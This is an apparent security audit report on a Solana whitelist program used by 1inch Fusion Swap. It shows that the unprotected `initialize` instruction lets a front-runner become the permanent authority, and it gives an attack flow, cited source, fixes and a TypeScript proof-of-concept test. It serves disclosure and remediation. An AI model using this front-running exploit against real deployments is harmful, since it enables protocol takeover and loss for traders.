# Audit Report

## Title
Whitelist Initialization Front-Running Allows Complete Protocol Takeover

## Summary
The `initialize` instruction in the whitelist program lacks authorization checks, allowing any attacker to front-run the legitimate initialization transaction during deployment and permanently set themselves as the whitelist authority. This grants complete control over resolver registration, enabling protocol monopolization or shutdown.

## Finding Description

The whitelist program's `initialize` function is responsible for setting the authority that controls which resolvers can fill orders in the Fusion Swap protocol. This critical initialization function contains no validation to restrict who can call it. [1](#0-0) 

The function simply accepts any signer as the authority and stores their public key. The `Initialize` account validation structure provides no constraints: [2](#0-1) 

The authority account is merely marked as `Signer<'info>` with no constraints like `constraint = authority.key() == EXPECTED_AUTHORITY`. The PDA for the whitelist state uses only a constant seed, making it deterministic and publicly calculable: [3](#0-2) 

The `init` constraint at line 49 ensures the account can only be initialized once, meaning **the first caller permanently becomes the authority**.

**Attack Flow:**

1. The 1inch team deploys the whitelist program to mainnet
2. An attacker monitors the blockchain for program deployment
3. Before the legitimate team initializes, the attacker submits their own `initialize` transaction with higher priority fees
4. The attacker's transaction executes first, setting `whitelist_state.authority = attacker.key()`
5. The legitimate initialization fails because the account already exists (init constraint prevents re-initialization)
6. The attacker now permanently controls the whitelist authority

**Impact on Protocol Security:**

The whitelist authority has complete control over resolver registration. Both `register` and `deregister` functions enforce authority-only access: [4](#0-3) [5](#0-4) 

This control is critical because the Fusion Swap protocol requires all order fillers to be whitelisted. The `fill` instruction validates this through a required `resolver_access` PDA: [6](#0-5) 

Similarly, `cancel_by_resolver` requires whitelist validation: [7](#0-6) 

Without a valid `resolver_access` PDA from the whitelist program, no one can fill orders or perform resolver-based cancellations. The attacker who controls the whitelist authority effectively controls the entire order execution system.

## Impact Explanation

**Severity: CRITICAL**

This vulnerability results in complete protocol compromise:

1. **Total Access Control Takeover**: The attacker becomes the permanent whitelist authority. The `set_authority` function requires the current authority's signature, which the attacker now controls: [8](#0-7) 

2. **Protocol Monopolization**: The attacker can whitelist only themselves as resolvers, monopolizing all order fills. They can extract maximum value from every order by filling at the least favorable rates within the Dutch auction curve.

3. **Protocol Shutdown**: The attacker can refuse to whitelist anyone, effectively shutting down the entire Fusion Swap protocol. All orders become unfillable (except through maker cancellation), and no new orders can be executed.

4. **Difficult Recovery**: While the protocol team could upgrade the program, this requires reactive measures after damage has occurred, including reputation damage, unfillable orders, and emergency response procedures.

## Likelihood Explanation

**Likelihood: HIGH**

1. **Public Knowledge**: Solana program deployments are entirely public. The program ID and PDA addresses can be calculated by anyone monitoring the blockchain.

2. **Trivial Exploitation**: The attack requires only basic Solana development knowledge to calculate the deterministic PDA, construct an `initialize` transaction, and submit with higher priority fees.

3. **No Technical Barriers**: The attacker needs only a Solana wallet with minimal SOL for transaction fees and basic transaction construction ability.

4. **Critical Time Window**: There is an unavoidable window between program deployment and initialization during which the vulnerability is exploitable. On Solana, these are necessarily separate transactions.

5. **High Economic Incentive**: Complete control over a DeFi protocol handling significant trading volume provides enormous economic incentive through monopolization, ransom, or reputation damage.

## Recommendation

Implement authorization checks in the `initialize` instruction to restrict initialization to a predetermined authority address. Options include:

1. **Hardcoded Authority**: Add a constant for the expected authority public key and validate against it:

```rust
pub const EXPECTED_AUTHORITY: Pubkey = pubkey!("...");

#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(
        mut,
        constraint = authority.key() == EXPECTED_AUTHORITY @ WhitelistError::Unauthorized
    )]
    pub authority: Signer<'info>,
    // ... rest of accounts
}
```

2. **Program Upgrade Authority**: Validate that the signer is the program's upgrade authority using Solana's program account data.

3. **Multi-Sig Initialization**: Require multiple signatures from predetermined addresses before initialization can occur.

The most secure approach for initial deployment is to initialize the whitelist state in the same transaction as program deployment using a deployment script that atomically deploys and initializes.

## Proof of Concept

```typescript
import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Whitelist } from "../target/types/whitelist";

describe("Whitelist Front-Running Attack", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.Whitelist as Program<Whitelist>;
  
  it("Attacker can front-run initialization", async () => {
    // Attacker generates their own keypair
    const attacker = anchor.web3.Keypair.generate();
    
    // Fund attacker
    await provider.connection.requestAirdrop(
      attacker.publicKey,
      1000000000
    );
    
    // Derive the deterministic whitelist state PDA
    const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("whitelist_state")],
      program.programId
    );
    
    // Attacker calls initialize before legitimate team
    await program.methods
      .initialize()
      .accountsPartial({
        authority: attacker.publicKey,
        whitelistState: whitelistStatePDA,
      })
      .signers([attacker])
      .rpc();
    
    // Verify attacker is now the authority
    const whitelistState = await program.account.whitelistState.fetch(
      whitelistStatePDA
    );
    assert.equal(
      whitelistState.authority.toString(),
      attacker.publicKey.toString()
    );
    
    // Legitimate team's initialization now fails
    const legitimateAuthority = anchor.web3.Keypair.generate();
    try {
      await program.methods
        .initialize()
        .accountsPartial({
          authority: legitimateAuthority.publicKey,
        })
        .signers([legitimateAuthority])
        .rpc();
      assert.fail("Should have failed");
    } catch (e) {
      // Initialization fails because account already exists
      assert(e.toString().includes("already in use"));
    }
    
    // Attacker now controls all resolver registration
    const resolver = anchor.web3.Keypair.generate();
    await program.methods
      .register(resolver.publicKey)
      .accountsPartial({
        authority: attacker.publicKey,
      })
      .signers([attacker])
      .rpc();
  });
});
```

## Notes

This vulnerability is a **deployment-time** security issue. If the whitelist program has already been deployed and initialized on mainnet with the correct authority, this vulnerability is no longer exploitable for that deployment. However, it represents a critical flaw in the codebase that must be addressed before any new deployments, and demonstrates a fundamental access control weakness in the initialization pattern.

The test utility function confirms the lack of authorization: [9](#0-8) 

This shows that any keypair can be passed as the authority parameter with no validation.

### Citations

**File:** programs/whitelist/src/lib.rs (L9-9)
```rust
pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
```

**File:** programs/whitelist/src/lib.rs (L18-22)
```rust
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = ctx.accounts.authority.key();
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L44-58)
```rust
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L60-84)
```rust
#[derive(Accounts)]
#[instruction(user: Pubkey)]
pub struct Register<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can register new users
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + ResolverAccess::INIT_SPACE,
        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
        bump,
    )]
    pub resolver_access: Account<'info, ResolverAccess>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L86-109)
```rust
#[derive(Accounts)]
#[instruction(user: Pubkey)]
pub struct Deregister<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can deregister users from the whitelist
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    #[account(
        mut,
        close = authority,
        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
        bump,
    )]
    pub resolver_access: Account<'info, ResolverAccess>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L111-123)
```rust
#[derive(Accounts)]
pub struct SetAuthority<'info> {
    #[account(mut)]
    pub current_authority: Signer<'info>,
    #[account(
        mut,
        seeds = [WHITELIST_STATE_SEED],
        bump,
        // Ensures only the current authority can set new authority
        constraint = whitelist_state.authority == current_authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
}
```

**File:** programs/fusion-swap/src/lib.rs (L504-516)
```rust
#[derive(Accounts)]
#[instruction(order: OrderConfig)]
pub struct Fill<'info> {
    /// `taker`, who buys `src_mint` for `dst_mint`
    #[account(mut, signer)]
    taker: Signer<'info>,
    /// Account allowed to fill the order
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** programs/fusion-swap/src/lib.rs (L640-653)
```rust
#[derive(Accounts)]
#[instruction(order: OrderConfig)]
pub struct CancelByResolver<'info> {
    /// Account that cancels the escrow
    #[account(mut, signer)]
    resolver: Signer<'info>,

    /// Account allowed to cancel the order
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, resolver.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** tests/utils/utils.ts (L473-503)
```typescript
export async function initializeWhitelist(
  program: anchor.Program<Whitelist>,
  authority: anchor.web3.Keypair
) {
  const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
    [Buffer.from("whitelist_state")],
    program.programId
  );
  try {
    await program.account.whitelistState.fetch(whitelistStatePDA);
  } catch (e) {
    const isBankrun = program.provider instanceof BankrunProvider;
    if (
      (!isBankrun &&
        e.toString().includes(ANCHOR_ACCOUNT_NOT_FOUND_ERROR_PREFIX)) ||
      (isBankrun &&
        e.toString().includes(BANKRUN_ACCOUNT_NOT_FOUND_ERROR_PREFIX))
    ) {
      // Whitelist state does not exist, initialize it
      await program.methods
        .initialize()
        .accountsPartial({
          authority: authority.publicKey,
        })
        .signers([authority])
        .rpc();
    } else {
      throw e; // Re-throw if it's a different error
    }
  }
}
```
